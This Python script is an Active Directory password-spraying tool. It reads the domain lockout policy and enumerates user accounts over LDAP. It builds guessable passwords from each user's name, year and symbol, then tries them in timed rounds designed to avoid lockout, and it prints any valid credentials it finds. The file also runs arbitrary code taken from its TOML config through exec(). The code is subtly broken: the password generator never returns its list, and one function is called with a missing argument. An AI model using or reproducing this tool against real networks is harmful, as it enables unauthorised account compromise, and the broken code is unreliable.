import argparse
import re
import time
import toml
from ldap3 import Server, Connection, ALL
from ldap3.core.exceptions import LDAPBindError
from typing import List, Dict
import os

def get_default_naming_context(server, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    return server.info.other['defaultNamingContext'][0]

def get_lockout_policy(server, base_dn, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    conn.search(base_dn, '(objectClass=domain)', attributes=['lockoutDuration', 'lockoutObservationWindow', 'minPwdLength'])
    entry = conn.entries[0]
    return {
        'lockoutDuration': entry['lockoutDuration'].value.total_seconds(),
        'lockoutObservationWindow': entry['lockoutObservationWindow'].value.total_seconds(),
        'minPwdLength': int(entry['minPwdLength'].value)
    }

def enumerate_user_attributes(server, base_dn, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    conn.search(
        search_base=base_dn,
        search_filter='(&(objectCategory=person)(objectClass=user))',
        attributes=['sAMAccountName', 'givenName', 'sn']
    )
    return [
        {
            'sAMAccountName': entry['sAMAccountName'].value,
            'givenName': entry['givenName'].value if 'givenName' in entry else '',
            'sn': entry['sn'].value if 'sn' in entry else ''
        }
        for entry in conn.entries if 'sAMAccountName' in entry
    ]

def filter_users(user_attrs: List[Dict], exclude_regexes: List[str]) -> List[Dict]:
    patterns = [re.compile(rgx, re.IGNORECASE) for rgx in exclude_regexes]
    filtered = []
    for user in user_attrs:
        name = user['sAMAccountName']
        if any(p.search(name) for p in patterns):
            continue
        filtered.append(user)
    return filtered

def try_bind(server, domain, username, password):
    try:
        conn = Connection(server, user=f'{domain}\\{username}', password=password, auto_bind=True, authentication='NTLM')
        return True
    except LDAPBindError:
        return False

def generate_passwords_from_toml(config_path, user_attributes, min_length):
    if os.path.isfile(config_path):
        config = toml.load(config_path)
    else:
        script_dir = os.path.dirname(os.path.realpath(__file__))
        alt_path = os.path.join(script_dir, config_path)
        if os.path.isfile(alt_path):
            config = toml.load(alt_path)
        else:
            raise FileNotFoundError(f"Could not find the TOML configuration file: {config_path}")

    all_passwords = []

    for key, entry in config.items():
        importance = entry.get("importance", 0)
        template = entry.get("template")
        code = entry.get("code")
        years = entry.get("years", [])
        symbols = entry.get("symbols", [""])

        if not isinstance(years, list):
            years = [str(years)]

        username = user_attributes.get("sAMAccountName", "")
        first_name = user_attributes.get("givenName", "")
        last_name = user_attributes.get("sn", "")

        if not first_name:
            continue

        first_char_cap = first_name[0].upper() + first_name[1:] if len(first_name) > 1 else first_name.upper()
        last_char_cap = last_name[0].upper() + last_name[1:] if len(last_name) > 1 else last_name.upper()

        passwords = []

        if code:
            local_vars = {
                "username": username,
                "first_name": first_name,
                "last_name": last_name,
                "first_name_first_char_capitalized": first_char_cap,
                "last_name_first_char_capitalized": last_char_cap,
                "years": years,
                "symbol": symbols,
                "passwords": passwords,
            }

            # Inject all other user-defined TOML variables into local_vars
            for k, v in entry.items():
                if k not in ("template", "code", "importance"):
                    local_vars[k] = v
            exec(code, {}, local_vars)
        elif template:
            for year in years:
                for symbol in symbols:
                    pw = template
                    pw = pw.replace("{username}", username)
                    pw = pw.replace("{first_name_first_char_capitalized}", first_char_cap)
                    pw = pw.replace("{last_name_first_char_capitalized}", last_char_cap)
                    pw = pw.replace("{year}", str(year))
                    pw = pw.replace("{symbol}", symbol)
                    passwords.append(pw)

        for pw in passwords:
            if len(pw) >= min_length:
                all_passwords.append((importance, pw))

def main():
    parser = argparse.ArgumentParser(description='LDAP Bruteforcer for Active Directory')
    parser.add_argument('--host', required=True, help='IP or hostname of the LDAP server')
    parser.add_argument('--domain', required=True, help='AD domain name (e.g., CONTOSO)')
    parser.add_argument('--valid-user', required=True, help='A known valid domain user (for querying policies)')
    parser.add_argument('--valid-pass', required=True, help='Password of the valid domain user')
    parser.add_argument('--exclude-regex', nargs='*', default=["Administrator", "krbtgt", "\\$$","MSOL.*", "service.*", "svc.*", "HealthBox.*", "Guest"], help='Regex patterns to exclude usernames')
    parser.add_argument('--patterns', default='patterns.toml', help='TOML file containing password generation patterns')
    parser.add_argument('--only-show-generated-passwords', action='store_true', help='Only print generated passwords without attempting login')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output for each login attempt')
    args = parser.parse_args()

    server = Server(args.host, get_info=ALL)
    base_dn = get_default_naming_context(server, args.domain, args.valid_user, args.valid_pass)
    policy = get_lockout_policy(server, base_dn, args.domain, args.valid_user, args.valid_pass)

    dynamic_delay = policy['lockoutObservationWindow'] if policy['lockoutObservationWindow'] > 0 else 1.0

    print(f"[*] Lockout Observation Window: {policy['lockoutObservationWindow']} seconds")
    print(f"[*] Using delay of {dynamic_delay:.2f} seconds between password rounds")
    print(f"[*] Minimum Password Length: {policy['minPwdLength']}")
    if args.verbose:
        print("[*] Enumerating users...")

    user_attrs = enumerate_user_attributes(server, base_dn, args.valid_user, args.valid_pass)
    if args.verbose:
        print(f"[*] Found {len(user_attrs)} users before filtering")

    filtered_users = filter_users(user_attrs, args.exclude_regex)
    if args.verbose:
        print(f"[*] {len(filtered_users)} users remaining after filtering")

    user_passwords_map = {}
    max_passwords = 0

    for user in filtered_users:
        passwords = generate_passwords_from_toml(args.patterns, user, policy['minPwdLength'])
        user_passwords_map[user['sAMAccountName']] = passwords
        max_passwords = max(max_passwords, len(passwords))

    if args.only_show_generated_passwords:
        for username, passwords in user_passwords_map.items():
            for pw in passwords:
                print(f"{username}:{pw}")
        return

    for i in range(max_passwords):
        print(f"[*] Trying password round {i+1}")
        for user in filtered_users:
            username = user['sAMAccountName']
            pw_list = user_passwords_map.get(username, [])
            if i < len(pw_list):
                pw = pw_list[i]
                success = try_bind(server, args.domain, username, pw)
                if args.verbose:
                    print(f"[-] Tried {username}:{pw} => {'Success' if success else 'Fail'}")
                if success:
                    print(f"[+] VALID CREDENTIAL FOUND: {username}:{pw}")
        print(f"[*] Sleeping for {dynamic_delay:.2f} seconds to avoid lockout...")
        time.sleep(dynamic_delay)

if __name__ == '__main__':
    main()
